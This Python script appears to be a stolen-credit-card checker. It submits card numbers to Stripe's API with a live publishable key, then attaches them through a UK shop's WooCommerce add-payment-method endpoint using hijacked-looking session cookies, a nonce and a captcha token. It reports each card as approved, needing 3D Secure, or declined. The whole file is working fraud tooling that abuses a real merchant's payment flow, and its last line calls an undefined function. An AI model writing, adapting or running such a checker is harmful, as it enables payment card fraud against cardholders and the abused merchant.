import requests,re,time
def pp(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = f'billing_details[name]=+&billing_details[email]=sogeni4074%40reifide.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F69ce8c8ba7%3B+stripe-js-v3%2F69ce8c8ba7%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=75136&client_attribution_metadata[client_session_id]=a1647f22-ac05-4c2d-ae24-38d9de57e2c1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=e0ef8f26-a961-4463-add2-d86f8abacc14&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=6d657fdc-83fe-42ea-bbb6-35ac5b17e5fa04a313&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU4MjgxODI4LCJjZGF0YSI6IkI0VlJ5YS80ZzVwNGlUeHZYR01MUTdFRVZkWXJwUVVPcXVjdW9LMzNXRWUycW9XRmFGL1B5SkNhN1lzRU5zUFpCK1dRMXRGT1dWelgyUG5HMnkwbmFuTEFjNjhnZXZTaGM3M2RHdDlvRy9VRWZiVFVzd0dBMFJVWGluRTk1ZWhBcWV5aFJnczNkV1g5K0x1QUdtcU0rSmU1WUVkZkVsRHVmUE4zRFZLRlVreENCRnd0TXJtOHIwZlVpd1IvMENJVDFYMGMxRnd6NEVVUXV0UVEiLCJwYXNza2V5IjoiQnVRenZwZ2diYm5oaXNwc3I0SThwT0V1Z0Q5UHJDZ3NyM0F1WjJLdnRzV2x3WUsxUlJzb2dJTjREZTlhQ1ZXWUZjR0N1Y2xmbHE5MkpHYzBLWTJ2ZW1tSlkrVmpJTnc3cjlyc09GcTZ3MDBwVDJidFRXNE4wdmVvam1LWit4Q3RPTG9sdml3UzVJVllaZGVOREQwb3FhZUpOeFFFb0Q4bUFUT3pJZC9tdUN1Rk1ia1kwaWxkNnQ1QXFtOFFLTm9hbnFlZWs2MHBMc1RtdUJSQm53c1RvbkxlRTFjZVRuRkU4NUQ5cWdpMU12Y3Z5S2JPQm4yTEJKOXQrM0hUZ2hSeGhTbkNEaVB0OEN3dGlMUWowQVVGdU5lQjRPUWQvRys2STFJNHVTNXJDc2dLZkxLT2pvTFB4cmxGdXN0L0NCcjRzTkc1azU0MmtUUk41eFI0aXBlOE5uRitTWWVXaVRKbFY3ZjY2NFl1ZU9BUktzUmVCa1FnVVJIdDEyWHY1cWRMUUJmVStWQUcwazB1ZmQ0d2FwNzdpSjRVLzZsVVNkeFExd24zVkUyYjQrWlFTb2x5N1BhcHlFcE80elJENC9GcXBubFBFU0t3c0paSzhvNC85bjVGVENPMURpVEtLMWJlQkhNNDlsL2M5d25DK0Z1QmF1VksyWjFYWnZEeWFNb0pzR3VSZktUYmxBK0lxZmN4cTczaks1cWVBOWdGVXdDSS9PTldNelJMTlhwcWw4cFQ0bUh6bEh6OXIzNU1CNHZQUnBEMmdlbUJINllTM0pqa2tEblFGQjNHdkRNc1NBM3YvbVNaL21pSVBBbXhTLytlK0xGWnlqSGJPTDl2SHd6MTYveDhSYTk1Z2xoUFlqMkl4d1VOWkNMZWI1OVEvQTBzT1p2SklhVW5QV0NCUVZOODNaUVpCdEI5YTVHWGlyTXRDYmJ1aDZEanhLckl0cWNtWDdYWWVXdVN5dkp4dTcrcGRZL2M1bm1vMXdYT3p5WkYyaUN3TUJ3SlBGai9hMW5weFRyMWN2ZWluWDdvOTJwMGVSWS9PeEEzKzJBekJHazRNVVFpVm5GMENwcmh5MXlueG1wVGdjVUN0YkFKUjdMejljS2ZlakZ6Tk5vTEN1SENMUHBxaStCQkpKWHRhcm1NNGF6R0l2ZlFwYnZqcG45R0dGT1kzTDJNZUh1V2RQbUN4RXFwS3FPaTkzR1ZEZUN3ckE2ZXdwTTB6UEdtNERqVUNxM1hVWktUeElUZE85OXNBMEJ0OHFzc0hSOW1BSUZneXhXRS96ekxWNXhITDR1a3VjamlWYVJJTUpiSkFSYVpmdzR5aEh1M0tVcDZXZVhQbUV5YjFpakZKTWU0Vlc5RmhRMjVhVlBGZVR0RDQ1Z2NmQ1dWZVFpL0doN3FiekczbldBQTRuSjRyT25JME9iaFFDakNxbUFsRWt2Wm8wemZkclo2dFNpNWVoL2pNcExOQTdLYlpNSzNCMVpqNjFBSnF1bnAwTVdQZEJXQlBpVDl6SjFybmFKRGljekdMYjdkL3NqR0tESHFaNVBkSlpBQjA4RE91L2VlUktQU3BrV3ZwSG1jZzltZEJBN2xETkVhVkhobnFNTlo3TXBRK0pxU1puZnJsNFFqTVFJWEkzSFFabzROQUhoZStISHU2Q2JTcFFZYjcwWE14dklJeWhpUlFnZGNHcllsalpjZTVaZDljVERuK29SbE84Z0Y0S0ZiK2FvTTd0NW1XSW5GMitzWkFTY25pdjJCQ2VNNFNpLzZzaXpjSlpRUWI3cHNmaUVCZXYrTW9DZU1XSW9lUzE0citOd0RzR2lsV3pRRmF1ZGtva0wwTEpRNVkrbkpNUWRONDY4bk9MSUd3a3k1by9YMmlPODNMLzJIT05sUXpGOCs3U08wcXpDRDFUUWJ3WUY1ZWE2MkVRaDNERVI5YURpbkdadnVNUFJzSXlzdm5MMlZtWGZxNkM4VHdwV0hicGRIeFRrWU11eGFGdUJ5UUFPUUdtNk9aL0ZaVWx5L0ZTUlM2c3Z1QkZURHd4WHdMdmVrZVdPQzJXRmIybVY4a0dBMHRxWXNpc0l5bmdYa0RFVFdtanFsWjE0dzVabFJZY3FOZVB4cTN4QUJMalY5QVJlQzQvd1FlR3g1T1FKcmJnMk1HMnBIcW5MbFNyQWFSMk1TL0pJZGpOZE1kNEMraUFqR0lBT3Rudld4RU1zWmUrTElhRzA4MUppeHlrUVNlelZwWWJhRStJMlErUDZEeFREMmxKSzZmM0czbkV3N1YrVzI3QmpzaVE9PSIsImtyIjoiNDA5ZDcxMjEiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.HDcymZ9Lu7CWOfScWAQmwi3PnAaFPTmnqNx2Hqew2Ko'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    response_data = response.json()  # Parse the response as JSON

    if 'error' in response_data:
        error_code = response_data['error']['code']
        if error_code == 'incorrect_number':
            return "Card number invalid"
        elif error_code == 'invalid_expiry_year':
            return "card expire date dekh"
        else:
            print("An error occurred:", response_data['error']['message'])
            return response_data['error']['message']
    else:
        response_json = response.json()
        id = response_json.get('id', 'No id found')
        # print(f"Payment source created successfully. ID: {id}")
        

    cookies = {
    'wordpress_sec_770c706eea1236171dc55a3d679b65cf': 'sogeni4074%7C1759491261%7C95y6ss4l4kUDmOPZBtehdK35tR9GqrHy3aC3KX3Tptb%7C4f54ee653bce9cd90c18e8d5e33097792f85effc77097ffa08298da910465728',
    '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-09-19%2011%3A03%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-09-19%2011%3A03%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'PHPSESSID': 'eu8n8ugo2uocm9hd22323l2gc0',
    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'sogeni4074%7C1759491261%7C95y6ss4l4kUDmOPZBtehdK35tR9GqrHy3aC3KX3Tptb%7C6067650b07cfe07ec0715228809c1a3c593b6749a744b6dacd1133e17968ed44',
    'mcfw-wp-user-cookie': 'NzMzfDB8NjN8Njc4Xzc4MmFmMmE1MjliYzA0OTFiYTU5ZTU4MGNkMTYyMWIzNmVhNDk3MGZhNGVhOTQ1YTIwYWM2NGQ1YjRjNjc0YWM%3D',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '__stripe_sid': '6d657fdc-83fe-42ea-bbb6-35ac5b17e5fa04a313',
}

    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    'origin': 'https://johnnysbackyard.co.uk',
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    files = {
    'action': (None, 'create_setup_intent'),
    'wcpay-payment-method': (None, id),
    '_ajax_nonce': (None, '54c84018d0'),
}

    response = requests.post('https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, files=files)        
    


    data = response.json()
    main_data = data.get('data', {})
    status = main_data.get('status')

    if data.get('success') == True and status == 'succeeded':
      #  print("Approved")
        return "Approved"
    elif data.get('success') == True and status == 'requires_action':
       # print("3D Required")
        return "3D Required"
    else:
        message = data.get("data", {}).get("error", {}).get("message", "")
        if "declined" in message.lower():
          #  print("Card was Declined")
            return "Card was Declined"
        else:
          #  print("Message:", message)
            return message
print(vbv("4258810718226890|02|2027|653"))        
        
    
        